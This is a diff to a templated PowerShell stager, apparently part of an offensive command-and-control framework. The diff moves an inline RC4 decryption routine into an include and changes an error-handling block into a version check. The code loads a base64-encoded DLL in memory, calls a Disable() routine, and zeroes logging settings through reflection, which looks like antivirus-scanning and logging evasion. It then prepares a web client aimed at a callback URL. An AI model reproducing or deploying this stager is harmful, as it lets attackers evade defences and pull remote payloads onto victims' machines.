@@ -1,45 +1,7 @@
 ${{symbol_name("CALLBACK_URL")}} = "{{callback_url}}"
 ${{symbol_name("KEY")}} = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")
 
-function {{symbol_name("Decrypt-Code")}} {
-    # RC4
-    param(
-        [Byte[]]$buffer,
-        [Byte[]]$key
-  	)
-
-    $s = New-Object Byte[] 256;
-    $k = New-Object Byte[] 256;
-
-    for ($i = 0; $i -lt 256; $i++)
-    {
-        $s[$i] = [Byte]$i;
-        $k[$i] = $key[$i % $key.Length];
-    }
-
-    $j = 0;
-    for ($i = 0; $i -lt 256; $i++)
-    {
-        $j = ($j + $s[$i] + $k[$i]) % 256;
-        $temp = $s[$i];
-        $s[$i] = $s[$j];
-        $s[$j] = $temp;
-    }
-
-    $i = $j = 0;
-    for ($x = 0; $x -lt $buffer.Length; $x++)
-    {
-        $i = ($i + 1) % 256;
-        $j = ($j + $s[$i]) % 256;
-        $temp = $s[$i];
-        $s[$i] = $s[$j];
-        $s[$j] = $temp;
-        [int]$t = ($s[$i] + $s[$j]) % 256;
-        $buffer[$x] = $buffer[$x] -bxor $s[$t];
-    }
-
-    $buffer
-}
+{% include "powershell/rc4.ps1" %}
 
 
 function {{symbol_name("Decrypt-String")}} {
@@ -67,13 +29,13 @@ if(-not ([System.Management.Automation.PSTypeName]"$string1").Type) {
     [Reflection.Assembly]::Load([Convert]::FromBase64String($DLL)) | Out-Null
 }
 
-try {
+if ($PSVersionTable.PSVersion.Major -ge 5) {
     IEX "[$string1]::Disable()"
 
     $settings = [Ref].Assembly.GetType($string2).GetField($string3,$string4).GetValue($null);
     $settings[$string5] = @{}
     $settings[$string5].Add($string6, "0")
-} catch {}
+}
 
 $K=new-object net.webclient
 $K.proxy=[Net.WebRequest]::GetSystemWebProxy()
